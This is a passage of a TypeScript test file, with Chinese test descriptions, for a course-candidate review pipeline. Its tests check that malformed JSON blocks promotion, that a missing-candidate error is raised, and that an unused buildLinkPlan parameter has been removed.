        expect(parsedReview.ok, `应当判无效：${JSON.stringify(badJson)}`).toBe(false);
        expect(parsedReview.errors.join(" ")).toMatch(/不是合法 JSON|解析失败/);

        const gate = gateFor(
          env,
          stored,
          parsedReview.file,
          parsedReview.errors,
          stored.metadata.matching.canonicalLibrary.digest,
        );
        expect(gate.status).not.toBe("PROMOTABLE");
        expect(gate.checks.find((c) => c.name === "human_review_present")?.passed).toBe(false);

        const plan = buildLinkPlan({ stored, review: parsedReview.file, gate });
        expect(plan.allowed).toBe(false);
        expect(plan.entries).toEqual([]);

        const promoted = promoteCourseCandidate({
          stored,
          gate,
          review: parsedReview.file,
          coursesDir: env.coursesDir,
        });
        expect(promoted.ok).toBe(false);
        expect(existsSync(join(env.coursesDir, "f-d"))).toBe(false);
      } finally {
        env.dispose();
      }
    }
  });

  it("candidate.json 坏 JSON ⇒ 明确的缺失/损坏错误，而不是 JSON 抛穿", () => {
    const env = makeEnv();
    try {
      const candidatesRoot = join(env.contentRoot, "course-candidates");
      const dir = join(candidatesRoot, "f-d2");
      mkdirSync(dir, { recursive: true });
      writeFileSync(join(dir, "candidate.json"), '{"digests": ', "utf8");
      writeFileSync(join(dir, "course.json"), "{}", "utf8");

      expect(() => readStoredCandidate("f-d2", candidatesRoot)).toThrow(CourseCandidateMissingError);
      expect(() => readStoredCandidate("f-d2", candidatesRoot)).toThrow(/不是合法 JSON|无法解析/);
    } finally {
      env.dispose();
    }
  });
});

describe("F-E —— 不得保留未使用的参数", () => {
  it("buildLinkPlan 不再要求 courseContentVersion（签名与调用点一致）", () => {
    const source = readFileSync(join(process.cwd(), "src/content/course-pipeline/review.ts"), "utf8");
    const signature = /export function buildLinkPlan\(input:\s*\{([\s\S]*?)\}\):\s*LinkPlanResult/.exec(source)?.[1] ?? "";
    expect(signature.length).toBeGreaterThan(30);
    expect(signature, "不得再声明 courseContentVersion").not.toContain("courseContentVersion");

    for (const file of ["scripts/course-review.ts", "tests/course-intake.test.ts"]) {
      const code = readFileSync(join(process.cwd(), file), "utf8");
      expect(code, `${file} 不得再向 buildLinkPlan 传 courseContentVersion`).not.toMatch(
        /buildLinkPlan\(\{[\s\S]{0,300}?courseContentVersion/,
      );
    }
  });
});
